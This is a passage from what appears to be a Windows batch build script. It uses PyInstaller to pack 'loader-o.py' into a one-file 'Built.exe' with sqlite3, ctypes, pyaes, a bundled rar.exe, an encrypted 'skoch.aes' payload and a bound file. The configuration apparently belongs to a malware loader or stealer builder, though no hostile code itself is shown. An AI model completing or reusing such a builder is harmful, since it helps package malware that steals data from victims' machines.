...
pyinstaller %mode% --onefile --clean --noconfirm loader-o.py --name "Built.exe" -i %icon% --hidden-import urllib3 --hidden-import sqlite3 --hidden-import pyaes --hidden-import ctypes --hidden-import ctypes.wintypes --hidden-import json --add-binary rar.exe;. --add-data rarreg.key;. --add-data skoch.aes;. --version-file version.txt %bound%
if %errorlevel%==0 (
    cls
